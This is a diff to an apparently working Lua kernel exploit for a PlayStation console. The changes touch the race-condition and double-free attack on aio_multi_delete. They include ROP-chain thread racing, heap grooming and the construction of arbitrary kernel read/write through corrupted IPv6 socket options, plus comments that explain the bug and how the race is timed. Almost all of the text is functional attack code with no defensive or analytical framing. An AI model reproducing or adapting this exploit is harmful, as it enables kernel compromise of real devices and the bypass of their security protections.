@@ -54,6 +54,12 @@ function dbgf(...)
     end
 end
 
+function wait_for(addr, threshold)
+    while memory.read_qword(addr):tonumber() ~= threshold do
+        sleep(1, "ns")
+    end
+end
+
 
 
 
@@ -437,7 +443,7 @@ end
 function make_reqs1(num_reqs)
     local reqs1 = memory.alloc(0x28 * num_reqs)
     for i=0,num_reqs-1 do
-        memory.write_dword(reqs1 + i*0x28 + 0x20, -1)  -- fd
+        memory.write_dword(reqs1 + i*0x28 + 0x20, -1) -- fd
     end
     return reqs1
 end
@@ -561,7 +567,6 @@ function setup(block_fd)
     return block_id, groom_ids
 end
 
-
 pipe_buf = memory.alloc(8)
 ready_signal = memory.alloc(0x8)
 deletion_signal = memory.alloc(0x8)
@@ -573,55 +578,19 @@ function reset_race_state()
     memory.write_qword(deletion_signal, 0)
 end
 
-
-
--- our own sync primitives, as we try to be independant on sony's lk offsets
-
-function wait_for(addr, threshold, do_yield)
-    if do_yield == nil then
-        do_yield = false
-    end
-    while memory.read_qword(addr):tonumber() ~= threshold do
-        if do_yield == true then
-            syscall.sched_yield()
-        else
-            sleep(1, "ns")
-        end
-    end
-end
-
--- spin until comparison is false
-function rop_wait_for(chain, value_address, op, compare_value)
-
-    local timespec = memory.alloc(0x10)
-    memory.write_qword(timespec, 0) -- tv_sec
-    memory.write_qword(timespec+8, 1) -- tv_nsec
-
-    chain:gen_loop(value_address, op, compare_value, function()
-        chain:push_syscall(syscall.nanosleep, timespec)
-    end)
-end
-
-
-
-
-
-
-
-
-
-
 function prepare_aio_multi_delete_rop(request_addr, sce_errs, pipe_read_fd)
 
     local chain = ropchain()
 
+    -- set worker thread core to be the same as main thread core so they 
+    -- will use similar per-cpu freelist bucket
     rop_pin_to_core(chain, MAIN_CORE)
     rop_set_rtprio(chain, MAIN_RTPRIO)
 
     -- mark thread as ready
     chain:push_write_qword_memory(ready_signal, 1)
 
-    -- wait until it is signalled to start the delete op
+    -- this will block the thread until it is signalled to run
     chain:push_syscall(syscall.read, pipe_read_fd, pipe_buf, 1)
 
     -- do the deletion op
@@ -634,6 +603,43 @@ function prepare_aio_multi_delete_rop(request_addr, sce_errs, pipe_read_fd)
 end
 
 
+-- summary of the bug at aio_multi_delete():
+--
+-- void free_queue_entry(struct aio_entry *reqs2)
+-- {
+--     if (reqs2->ar2_spinfo != NULL) {
+--         printf("[0]%s() line=%d Warning !! split info is here\n", __func__, __LINE__);
+--     }
+--     if (reqs2->ar2_file != NULL) {
+--         // we can potentially delay .fo_close()
+--         fdrop(reqs2->ar2_file, curthread);
+--         reqs2->ar2_file = NULL;
+--     }
+--     // can double free on reqs2
+--     // allocated size is 0x58 which falls onto malloc 0x80 zone
+--     free(reqs2, M_AIO_REQS2);
+-- }
+--
+-- int _aio_multi_delete(struct thread *td, SceKernelAioSubmitId ids[], u_int num_ids, int sce_errors[])
+-- {
+--     // ...
+--     struct aio_object *obj = id_rlock(id_tbl, id, 0x160, id_entry);
+--     // ...
+--     u_int rem_ids = obj->ao_rem_ids;
+--     if (rem_ids != 1) {
+--         // BUG: wlock not acquired on this path
+--         obj->ao_rem_ids = --rem_ids;
+--         // ...
+--         free_queue_entry(obj->ao_entries[req_idx]);
+--         // the race can crash because of a NULL dereference since this path
+--         // doesn't check if the array slot is NULL so we delay
+--         // free_queue_entry()
+--         obj->ao_entries[req_idx] = NULL;
+--     } else {
+--         // ...
+--     }
+--     // ...
+-- }
 function race_one(request_addr, tcp_sd, sds)
 
     reset_race_state()
@@ -647,17 +653,24 @@ function race_one(request_addr, tcp_sd, sds)
     -- prepare ropchain to race for aio_multi_delete
     local delete_chain = prepare_aio_multi_delete_rop(request_addr, sce_errs, pipe_read_fd)
 
-    -- NOTE: by using thr_new's based thread, we cant call pthread_* or else the process will crash
+    -- spawn worker thread
     local thr = prim_thread:new(delete_chain)
     local thr_tid = thr:run()
 
-    -- wait for the worker to enter the barrier and sleep
+    -- wait for the worker thread to ready
     wait_for(ready_signal, 1)
 
     local suspend_chain = ropchain()
 
+    -- notify worker thread to resume
     suspend_chain:push_syscall(syscall.write, pipe_write_fd, pipe_buf, 1)
+
+    -- yield and hope the scheduler runs the worker next.
+    -- the worker will then sleep at soclose() and hopefully we run next
     suspend_chain:push_syscall(syscall.sched_yield)
+
+    -- if we get here and the worker hasn't been reran then we can delay the 
+    -- worker's execution of soclose() indefinitely
     suspend_chain:push_syscall_with_ret(syscall.thr_suspend_ucontext, thr_tid)
     
     suspend_chain:restore_through_longjmp()
@@ -668,7 +681,7 @@ function race_one(request_addr, tcp_sd, sds)
     -- local suspend_res = syscall.thr_suspend_ucontext(thr_tid):tonumber()
     dbgf("suspend %s: %d", hex(thr_tid), suspend_res)
 
-    local poll_err = memory.alloc(4);
+    local poll_err = memory.alloc(4)
     aio_multi_poll(request_addr, 1, poll_err)
     local poll_res = memory.read_dword(poll_err):tonumber()
     dbgf("poll: %s", hex(poll_res))
@@ -1414,17 +1427,17 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
     end
 
     if sd_pair == nil then
-        error('failed to make aliased pktopts');
+        error('failed to make aliased pktopts')
     end
 
-    return sd_pair, sd
+    return sd_pair
 end
 
 
 -- k100_addr is double freed 0x100 malloc zone address
 -- dirty_sd is the socket whose rthdr pointer is corrupt
 -- kernel_addr is the address of the "evf cv" string
-function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds, sds_alt, aio_info_addr)
+function make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_addr)
 
     local master_sock = pktopts_sds[1]
     local tclass = memory.alloc(4)
@@ -1594,9 +1607,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds, sds
     kernel.read_buffer = ipv6_kernel_rw.read_buffer
     kernel.write_buffer = ipv6_kernel_rw.write_buffer
 
-    dbg("test dump:")
-    dbg(kernel.hex_dump(kernel_addr))
-
     local kstr = kernel.read_null_terminated_string(kernel_addr)
     if kstr ~= "evf cv" then
         error("test read of &\"evf cv\" failed")
@@ -1638,7 +1648,8 @@ end
 
 
 function post_exploitation_ps4()
-
+    printf("ps4 is not yet supported for jailbreaking")
+    return
 end
 
 
@@ -1878,15 +1889,15 @@ function kexploit()
             = leak_kernel_addrs(sd_pair, sds)
 
         print("\n[+] Double free SceKernelAioRWRequest\n")
-        local pktopts_sds, dirty_sd
+        local pktopts_sds 
             = double_free_reqs1(reqs1_addr, target_id, evf, sd_pair[1], sds, sds_alt, fake_reqs3_addr)
 
         syscall.close(fake_reqs3_sd)
             
-        print('\n[+] Get arbitrary kernel read/write\n');
-        make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr)
+        print('\n[+] Get arbitrary kernel read/write\n')
+        make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr)
 
-        print('\n[+] Post exploitation\n');
+        print('\n[+] Post exploitation\n')
 
         if PLATFORM == "ps4" then
             post_exploitation_ps4()
@@ -1908,7 +1919,7 @@ function kexploit()
         print(err)
     end
 
-    print('\ncleaning up');
+    print('\ncleaning up')
 
     -- clean up
 
